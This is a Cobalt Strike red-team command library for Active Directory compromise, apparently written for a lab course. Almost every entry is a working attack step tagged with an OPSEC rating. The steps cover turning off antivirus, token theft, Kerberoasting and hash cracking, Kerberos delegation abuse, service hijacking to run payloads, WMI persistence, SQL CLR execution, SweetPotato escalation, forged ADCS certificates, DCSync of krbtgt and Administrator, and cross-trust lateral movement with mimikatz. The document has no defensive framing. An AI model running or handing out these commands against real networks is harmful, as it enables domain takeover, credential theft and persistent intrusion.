# Red Team Ops & Cobalt Strike Command Library  

## Description and commands    

>Attacker desktop add hosts file entry for internal DNS resolution OPSEC-🟢SAFE

```powershell
Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value "10.10.120.1 lon-dc-1 lon-dc-1.contoso.com contoso.com"
```

>Disable Antivirus real time monitor scanning OPSEC-🟠CAUTION

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

>Beacon sleep 3 seconds jitter 20 OPSEC-🟢SAFE

```cs
sleep 3 20
```  

>Open Process browser tab current beacon OPSEC-🟢SAFE

```cs
process_browser
```  

>Impersonated by stealing users Windows access token from that process OPSEC-🟢SAFE

```
steal_token 1234
```  

>spoof parent OPSEC-🟢SAFE

```cs
ppid <explorer.exe PID>
```  

>spawnto set to werfault.exe after first beacon OPSEC-🟢SAFE

```cs
spawnto x64 %windir%\sysnative\werfault.exe
```  

>Get User ID OPSEC-🟢SAFE

```cs
getuid
```  

>Working Directory OPSEC-🟢SAFE

```cs
pwd
```  

>List processes in beacon console OPSEC-🟢SAFE 

```cs
ps
```  

>Kerberos Triage action will output a table of the current user's Kerberos tickets OPSEC-🟢SAFE

```cs
krb_triage
```  

> Enumerate Domain, OUs, GPOs — with ACL data for BloodHound edges OPSEC-🟢SAFE 

```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```

>Enumerate Users, computers, groups — with ACL data OPSEC-🟢SAFE

```
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
```

>Enumerate users + computers + groups in one OPSEC-🟢SAFE  

```cs
ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor,samaccountname,memberof,admincount,servicePrincipalName,dNSHostName,operatingSystem
```

>Find groups that grant sysadmin on the SQL server OPSEC-🟢SAFE

```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```  

>Enumerate computers OPSEC-🟢SAFE  

```cs
ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
```  

>Enumerate domain inbound or outbound trust OPSEC-🟢SAFE 

```
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
```  

>Enumerate AS-REP roastable, no Kerberos pre-authentication required, can request AS-REP hash without credentials OPSEC-🟢SAFE

```
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName
```

>Enumerate Constrained delegation config OPSEC-🟢SAFE

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

>Enumerate Unconstrained delegation, any computer/user with unconstrained delegation coerce relay DC to auth to it, capture TGT OPSEC-🟢SAFE

```
ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl
```

>Find existing Resource Based Constrained Delegation (RBCD) config OPSEC-🟢SAFE

```
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 'lon-dc-1' | select Name,PrincipalsAllowedToDelegateToAccount
```

>Enumerate Domain structure OU and GPO OPSEC-🟢SAFE 

```
ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
```

>Copy Beacon Logs to Attacker Desktop, On attacker desktop open Ubuntu tab in Windows Terminal OPSEC-🟢SAFE 

```sh
cd /mnt/c/Users/Attacker/Desktop
scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
```

>Parse Logs with BOFHound tool on Ubuntu WSL, Output JSON copy to BloodHound OPSEC-🟢SAFE

```
bofhound -i logs
```

>Dump krbtgt for a user, need to be SYSTEM beacon 

```cs
krb_triage
krb_dump /user:rsteel /service:krbtgt
```  

>Dump the machine account TGT from high integrity system user beacon  

```
krb_dump /luid:3e7 /service:krbtgt
```  

>Abuse delegation to forge a CIFS ticket as Administrator

```
krb_s4u /ticket:[<krb dump luid 3e7 service krbtgt>] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

>Drop impersonation when done

```
rev2self
```

>Use Output from krb_s4u or krb_dump. Save kirbi to disk run in PowerShell on attacker desktop OPSEC-🟢SAFE  

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64]"))
```

>S4U2Self to impersonate Administrator, use base64 TGT ticket, Request usable service ticket cifs/lon-fs-1 OPSEC-🟢SAFE

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-wkstn-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /dc:lon-dc-1 /outfile:C:\Users\Attacker\Desktop\
```

>Create sacrificial user logon session and inject user ticket in beacon OPSEC-🟢SAFE

```cs
beacon> make_token CONTOSO\rsteel FakePass
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
beacon> run klist
```  

>unmanaged PS list kerberos tickets OPSEC-🟠CAUTION

```
powerpick klist
```  

>S4U abuse — get service ticket impersonating Administrator

```
krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

>Output from krb_s4u Save kirbi on attacker desktop PowerShell  

```
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi", [Convert]::FromBase64String("[B64]"))
```  

>if SYSTEM privilege escalation needed OPSEC-🟠CAUTION  

```cs
getsystem
```  

>Rubeus use the Kerberos unconstrained delegation to obtain a TGT for current beacon user without needing credentials. run in any beacon    

```cs
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
```  

>Rubeus Obtain HASH value for only mssql_svc account and not triggering honeypot accounts, remain OPSEC-🟢SAFE 

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```  

>Hashcat offline crack

```
hashcat -a 0 -m 13100 /hashcat-cracking/cred-acc-challenge.hash /wordlists/rockyou.txt
```

>In the medium-integrity Beacon running as user, extract their TGT, no SYSTEM needed OPSEC-🟢SAFE  

```cs
krb_tgtdeleg
```  

>affects current beacon session fork & run, Sacrificial process for all subsequent commands to msedge.exe. No process is spawned, purely a runtime config OPSEC-🟢SAFE  

```cs
spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```  

>Set spawnto for the service payload, affects Artifact Kit service binary payloads. A service EXE payload that will create beacon OPSEC-🟢SAFE   

```cs
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```  

>Enumerate services where low-priv users have FullControl OPSEC-🟢SAFE

```cs
powerpick $lp = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lp -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq  [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject]@{ServiceName=$_.PSChildName; Identity=$ace.IdentityReference.Value}}}}
```  

>Record current service configuration  

```cs
sc_stop BadWindowsService
```  

>Upload payload OPSEC-🟠CAUTION   

```cs
upload C:\Payloads\http_x64.svc.exe
```  

>Reconfigure service to point at payload OPSEC-🟠CAUTION

```cs
sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
```  

>Start the service OPSEC-🟠CAUTION 

```cs
sc_start BadWindowsService
```  

>Remove delete payload file    

```cs
rm C:\Temp\http_x64.svc.exe
```  

>requires DA or replication privileges, cannot get there from a user beacon OPSEC-🟠CAUTION 

```cs
dcsync contoso.com CONTOSO\krbtgt
```  

>Load PowerView script into Beacon Memory, never writes to target OPSEC-🟢SAFE

```cs
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```

>Import powershell PowerView on attacker desktop in powershell window

```powershell
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
```  

>Find principals that have WriteProperty privileges on msDS-AllowedToActOnBehalfOfOtherIdentity attribute of computers.

```powershell
Get-DomainComputer -Server 'lon-dc-1' | Get-DomainObjectAcl -Server 'lon-dc-1' | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -eq 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```  

>Query LDAP to discover what is a SID 

```
Get-DomainObject -LDAPFilter '(objectSid=S-1-5-21-3926355307-1661546229-813047887-1107)' -Server 'lon-dc-1'
```

>Install WMI subscription triggers on Event 1502, client GPO refresh persistence OPSEC-🟠CAUTION

```cs
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject [BEACON PID] x64 Add-WmiPersistence
```  

>Enumerate WMI subscriptions powerpick, no child process OPSEC-🟢SAFE 

```cs
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```  

>Trigger GPO refresh to test persistence fires spawns gpupdate.exe child process OPSEC-🟠CAUTION 

```cs
execute gpupdate /target:computer /force
```  

>In new PowerShell window, the runas one: Request LDAP Service Ticket and Inject (PTT) OPSEC-🟠CAUTION 

```powershell
runas /netonly /user:CONTOSO\pchilds powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/lon-dc-1 /ticket:[ENCODED TGT] /dc:lon-dc-1 /ptt
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
```  

>Request an inter-realm referral ticket OPSEC-🟠CAUTION 

```cs
krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
```  

>AD Enumeration, Run in the runas PowerShell window where LDAP ticket cached, RSAT installed on host  

```powershell
Get-ADComputer -Filter * -Server lon-dc-1

Get-ADUser -Filter * -Server lon-dc-1
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server lon-dc-1

Get-ADOrganizationalUnit -Filter * -Server lon-dc-1

Get-ADGroup -Filter * -Server lon-dc-1
Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive

Get-ADTrust -Filter * -Server lon-dc-1

# GPOs
Get-GPO -All -Server lon-dc-1   # requires GroupPolicy module, pre-loaded in lab
```  

>Jump to target with WinRM, no service modification, no disk write OPSEC-🟢SAFE

```
jump winrm64 lon-ws-1 smb_custom
```  

>Start Rubeus monitor web server for incoming TGTs via SSPI coerce relay OPSEC-🟠CAUTION

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```

>Coerce DC to authenticate to Web Server OPSEC-🟠CAUTION

```cs
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```  

>Use Beacon to start a SOCKS proxy OPSEC-🟢SAFE

```
socks 1080 socks5
```  

>lanmanserver service disable to prevent it from automatically restarting.

```
sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
```  

>Start a reverse port forward that will bind to port 445 and redirect the traffic to 127.0.0.1:7445 attacker 

```cs
rportfwd_local 445 localhost 7445
```  

>Windows firewall, Add the rule Port 445 allow inbound

```cs
powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
```  

>Add new RBCD config between FS and WKSTN, making sure not to overwrite the existing entry.

```powershell
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 'lon-dc-1'
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 'lon-dc-1'
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 'lon-dc-1'
```  

>Get information about the DB instance and your current privileges OPSEC-🟢SAFE

```cs
sql-info lon-db-1
```

>confirm SQL sysadmin before proceeding OPSEC-🟢SAFE

```
sql-whoami lon-db-1
```  

>Check the status of SQL CLR

```cs
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```  

> CLR must be enabled on the SQL instance before it will accept and run assemblies.  

```cs
sql-enableclr lon-db-1
```  

>Load the CLR assembly on SQL server and execute the stored procedure.

```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```  

>TSVCPIPE name defined in CS SMB listener. Run this from user beacon, not from any impersonated session, need valid TGT in the session to auto-request CIFS.  

```cs
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```  

>Show all SQL linked servers configured on lon-db-1

```cs
sql-links lon-db-1
```  

>Check your privilege level on lon-db-2 via the link 

```cs
sql-whoami lon-db-1 "" lon-db-2
```  

>Check and Enable RPC Out on the link, required for CLR execution

```cs
sql-checkrpc lon-db-1
sql-enablerpc lon-db-1 lon-db-2
```  

>Execute CLR payload on lon-db-2 via the SQL link 

```cs
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```  

>Exploit SeImpersonatePrivilege with SweetPotato and connect new beacon

```cs
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
connect localhost 1337
```  

>ADCS ESC enumeration  

```cs
execute-assembly C:\Tools\Certify\Certify.exe find /vulnerable
```  

>Enumerate vulnerable templates only, suppress admin-only findings OPSEC-🟠CAUTION

```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
```  

>ESC1, Misconfigured Client Authentication Templates, request cert specify UPN in SAN

```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
```  

>Use cert to get TGT as target user OPSEC-🟠CAUTION

```cs
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
```  

>Proving Domain Admin Access with the Forged TGT, Inject TGT into beacon session OPSEC-🟢SAFE

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[BASE64_TGT]
```  

>Credential ticket harvest OPSEC-🟠CAUTION 

```cs
dcsync contoso.com CONTOSO\Administrator
```  

>Using WinRM to create new beacon OPSEC-🟢SAFE

```cs
jump winrm64 lon-dc-1.contoso.com smb
```  

>On CA server Dump the CA's certificate OPSEC-🟠CAUTION 

```cs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
```  

>Save the CA certificate to your attacker desktop.

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\lon-cs-1.pfx", [Convert]::FromBase64String("[CERT]"))
```  

>Use the certificate to force a user certificate for the default domain administrator account OPSEC-🟢SAFE

```powershell
C:\Tools\Certify\Certify\bin\Release\Certify.exe forge --ca-cert .\Desktop\lon-cs-1.pfx --upn Administrator --subject CN=Administrator,CN=Users,DC=contoso,DC=com --sid S-1-5-21-3926355307-1661546229-813047887-500 --crl ldap:///CN=CONTOSO Root CA,CN=lon-cs-1,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=CONTOSO,DC=com
```  

>DCSync shared inter-realm key from the TDO  Trust Domain Object OPSEC-🔴UNSAFE

```
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

>Request a TGT for the trust account using the shared secret in the mimikatz lsadump output OPSEC-🔴UNSAFE

```cs
krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.contoso.com
```  

>Enumerate the Foreign Security Principals Container of the foreign domain for trust abuse.

```cs
ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
```  

>Enumerate members of the group 'Partner Jump Users'.  

```cs
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" --attributes distinguishedName
```  

>Lookup domain controller in the foreign domain.

```cs
nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
```  

>Enumerate and List GPO information

```
ldapsearch (objectClass=groupPolicyContainer) --hostname par-dc-1.partner.com --dn DC=partner,DC=com --attributes displayName,gPCFileSysPath
```  

>Download the GPO's GptTmpl.inf, is Security Template file in GPO, define group membership via Group Membership

```cs
download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```  

>Request a TGT for rsteel from CONTOSO KDC OPSEC-🟠CAUTION

```cs
krb_asktgt /user:rsteel /aes256:<aes256_hmac-from-dcsync>
```  

>Request an inter-realm referral ticket OPSEC-🟠CAUTION

```cs
krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
```  

>Request a CIFS service ticket for par-jmp-1 from PARTNER KDC OPSEC-🟠CAUTION

```cs
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```  

>Lateral move to par-jmp-1 via WinRM OPSEC-🟢SAFE

```cs
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi
beacon> run klist
beacon> jump winrm64 par-jmp-1.partner.com smb
```  

>DCSync rsteel AES256 hash OPSEC-🟠CAUTION

```cs
dcsync contoso.com CONTOSO\rsteel
```  

>Request TGT for rsteel from CONTOSO KDC — OPSEC-🟠CAUTION

```cs
krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
```  

>Request inter-realm TGT — OPSEC-🟠CAUTION  

```cs
krb_asktgs /service:krbtgt/partner.com /ticket:<base64-TGT>
```  

>Request CIFS service ticket from PARTNER KDC OPSEC-🟠CAUTION 

```cs
krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```  

>Request HTTP service ticket from PARTNER KDC (needed for WinRM) OPSEC-🟠CAUTION 

```cs
krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<base64-INTER-REALM>
```  

>Decode tickets on attacker desktop (PowerShell, run before kerberos_ticket_use) OPSEC-🟢SAFE

```powershell
[System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_cifs.kirbi", [System.Convert]::FromBase64String("<base64>"))
[System.IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel_http.kirbi", [System.Convert]::FromBase64String("<base64>")) 
```  

>Inject CIFS ticket and verify OPSEC-🟢SAFE

```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_cifs.kirbi
run klist
```  

>Access C$ via SMB OPSEC-🟢SAFE 

```cs
ls \\par-jmp-1.partner.com\c$
```  

>Inject HTTP ticket and lateral move via WinRM — OPSEC-🟢SAFE  

```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel_http.kirbi
beacon> run klist
beacon> jump winrm64 par-jmp-1.partner.com smb
```  

